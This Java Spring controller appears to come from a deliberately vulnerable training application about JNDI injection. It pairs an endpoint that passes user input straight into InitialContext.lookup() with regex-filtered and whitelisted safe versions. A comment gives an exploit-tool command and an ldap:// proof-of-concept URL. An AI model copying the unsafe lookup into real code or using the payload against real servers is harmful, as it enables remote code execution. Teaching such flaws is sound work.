package com.best.hello.controller.JNDI;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.List;
import java.util.Arrays;


@Api("JNDI注入")
@RestController
@RequestMapping("/vulnapi/JNDI")
public class JNDIInject {
    Logger log = LoggerFactory.getLogger(JNDIInject.class);

    /**
     * lookup 方法会将传入的参数当作 JNDI 名称，如果参数值包含恶意的 JNDI 名称，那么攻击者就可以通过这种方式来执行任意的 JNDI 操作。
     * lookup：通过名字检索执行的对象，当lookup()方法的参数可控时，攻击者便能提供一个恶意的url地址来加载恶意类。
     * payload: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a Calculator" -A 127.0.0.1
     * PoC http://127.0.0.1:8888/JNDI/vul?content=ldap://127.0.0.1:1389/txhadi
     */
    @ApiOperation(value = "vul：JNDI注入")
    @GetMapping("/vul")
    public String vul(String content) {
        log.info("[vul] JNDI注入：" + content);
        try {
            Context ctx = new InitialContext();
            ctx.lookup(content);
        } catch (Exception e) {
            log.warn("JNDI错误消息");
        }
        return "JNDI注入";
    }

    @ApiOperation(value = "safe：正则拦截")
    @GetMapping("/safe1")
    public String safe(String content) {
        // 使用正则表达式限制参数的值
        if (content.matches("^[\\w\\.-]+$")) {
            try {
                Context ctx = new InitialContext();
                ctx.lookup(content);
            } catch (Exception e) {
                log.warn("JNDI错误消息");
            }
            return HtmlUtils.htmlEscape(content);
        } else {
            return "JNDI 正则拦截";
        }
    }


    @ApiOperation(value = "safe：白名单拦截")
    @GetMapping("/safe2")
    public String safe2(String content) {
        List<String> whiteList = Arrays.asList("java:comp/env/jdbc/mydb", "java:comp/env/mail/mymail");
        if (whiteList.contains(content)) {
            try {
                Context ctx = new InitialContext();
                ctx.lookup(content);
            } catch (Exception e) {
                log.warn("JNDI错误消息");
            }
            return HtmlUtils.htmlEscape(content);
        } else {
            return "JNDI 白名单拦截";
        }
    }
}
